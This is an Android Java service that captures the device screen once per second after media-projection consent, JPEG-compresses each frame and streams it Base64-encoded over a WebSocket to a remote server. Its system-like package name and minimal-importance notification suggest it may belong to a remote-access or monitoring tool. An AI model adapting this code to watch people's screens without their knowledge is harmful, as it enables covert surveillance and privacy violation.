package com.xrc.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import androidx.core.app.ServiceCompat;

import com.xrc.system.core.Constants;
import com.xrc.system.network.XRCWebSocketClient;
import com.xrc.system.ui.MainActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenCaptureService extends Service {
    private static final String TAG = Constants.TAG + ":ScreenSvc";
    private static final String SCREEN_CHANNEL = Constants.CHANNEL_ID + "_screen";
    private static final int MAX_WIDTH = 720;
    private static final int MAX_HEIGHT = 1280;
    private static final int JPEG_QUALITY = 50;
    private static final int FGS_TYPE_MEDIA_PROJECTION = 1 << 5;
    private MediaProjection projection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private HandlerThread bgThread;
    private Handler bgHandler;
    private int width, height;
    private volatile boolean capturing = false;

    @Override
    public void onCreate() {
        super.onCreate();
        bgThread = new HandlerThread("ScreenBg");
        bgThread.start();
        bgHandler = new Handler(bgThread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        ServiceCompat.startForeground(this, Constants.NOTIF_ID_SCREEN, buildNotification(), FGS_TYPE_MEDIA_PROJECTION);
        bgHandler.post(this::initCapture);
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        capturing = false;
        releaseCapture();
        if (bgThread != null) bgThread.quitSafely();
        super.onDestroy();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(SCREEN_CHANNEL, "Screen Capture",
                    NotificationManager.IMPORTANCE_MIN);
            ch.setDescription("Screen capture service");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, SCREEN_CHANNEL)
                .setContentTitle("Screen Capture")
                .setContentText("Capturing screen")
                .setSmallIcon(android.R.drawable.ic_menu_gallery)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
    }

    private void initCapture() {
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm == null) return;
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(metrics);
            float scale = Math.min((float) MAX_WIDTH / metrics.widthPixels,
                    (float) MAX_HEIGHT / metrics.heightPixels);
            if (scale > 1f) scale = 1f;
            width = (int) (metrics.widthPixels * scale);
            height = (int) (metrics.heightPixels * scale);
            int density = (int) (metrics.densityDpi * scale);

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            capturing = true;
            bgHandler.postDelayed(this::captureFrame, 1000);
        } catch (Exception e) {
            Log.e(TAG, "Init capture failed", e);
        }
    }

    private void captureFrame() {
        if (!capturing) return;
        try (Image image = imageReader.acquireLatestImage()) {
            if (image != null) {
                processImage(image);
            }
        } catch (Exception e) {
            Log.e(TAG, "Capture frame failed", e);
        }
        bgHandler.postDelayed(this::captureFrame, 1000);
    }

    private void processImage(Image image) {
        try {
            Image.Plane plane = image.getPlanes()[0];
            ByteBuffer buffer = plane.getBuffer();
            int pixelStride = plane.getPixelStride();
            int rowStride = plane.getRowStride();
            int rowPadding = rowStride - pixelStride * width;

            Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height,
                    Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);

            if (bitmap.getWidth() > width) {
                bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
            }

            ByteArrayOutputStream out = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out);
            byte[] jpeg = out.toByteArray();
            String b64 = Base64.encodeToString(jpeg, Base64.NO_WRAP);

            JSONObject data = new JSONObject();
            data.put("frame", b64);
            data.put("w", width);
            data.put("h", height);
            XRCWebSocketClient.get(this).sendEvent("screen_frame", data);
        } catch (JSONException e) {
            Log.e(TAG, "Screen JSON failed", e);
        }
    }

    private void releaseCapture() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        if (projection != null) {
            projection.stop();
            projection = null;
        }
    }

    public void setMediaProjection(MediaProjection mp) {
        this.projection = mp;
        if (imageReader != null) {
            virtualDisplay = projection.createVirtualDisplay("svc",
                    width, height, getResources().getDisplayMetrics().densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, bgHandler);
        }
    }
}
